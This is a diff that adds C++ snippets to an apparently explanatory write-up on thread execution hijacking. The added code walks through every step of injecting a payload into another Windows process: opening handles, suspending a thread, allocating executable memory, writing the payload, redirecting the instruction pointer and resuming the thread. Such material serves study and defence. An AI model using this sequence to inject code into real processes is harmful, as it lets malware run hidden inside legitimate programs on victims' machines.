@@ -31,25 +31,62 @@ CloseHandle(hSnapshot);
 
 Using Windows API calls such as `OpenProcess` and `OpenThread`, the attacker obtains handles to the target process and its threads. These handles allow them to manipulate the process's execution.
 
+```cpp
+//Open a Handle to the Target Process:
+HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE,targetProcessId);
+
+//Open a Handle to a Thread in the Target Process:
+HANDLE hThread = OpenThread(THREAD_ALL_ACCESS, FALSE, targetThreadId);
+
+```
+
 ### Suspending the Target Thread
 
 The identified thread within the process is suspended using the `SuspendThread` API call. Suspending the thread ensures that it is not executing any instructions while it is being manipulated. This ensures that the thread's execution is paused, allowing the malware to safely inject its code without interference.
+
+```cpp
+SuspendThread(hThread);
+
+```
 
 ### Allocating Memory in the Target Process
 
 Memory within the address space of the target process is allocated for the malicious code. This is typically done using `VirtualAllocEx`, which reserves a region of memory that can be written to and executed from.
 
+```cpp
+LPVOID pRemoteCode = VirtualAllocEx(hProcess, NULL, payloadSize, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
+
+```
+
 ### Writing Malicious Code
 
 The attacker then writes the malicious code or a DLL path into the allocated memory using `WriteProcessMemory`. This step plants the payload that will be executed within the context of the hijacked process. The malware writes its payload into the allocated memory using `WriteProcessMemory`. The payload could be shellcode, a path to a malicious DLL, or the address of `LoadLibrary`.
+
+```cpp
+WriteProcessMemory(hProcess, pRemoteCode, payload, payloadSize, NULL);
+
+```
 
 ### Modifying the Thread Context
 
 The context of the suspended thread (which includes the thread's register states and execution pointers) is retrieved using `GetThreadContext` to be modified to point to the injected code. This is achieved using `SetThreadContext`, which changes the thread's instruction pointer to the address of the malicious code.
 
+```cpp
+CONTEXT ctx;
+ctx.ContextFlags = CONTEXT_CONTROL;
+GetThreadContext(hThread, &ctx);
+ctx.Rip = (DWORD64)pRemoteCode;
+SetThreadContext(hThread, &ctx);
+
+```
 ### Resuming the Thread
 
 Finally, the thread is resumed using the `ResumeThread` API call. As the thread resumes execution, it starts running the injected malicious code.
+
+```cpp
+ResumeThread(hThread);
+
+```
 
 ## Advantages of Thread Execution Hijacking
 
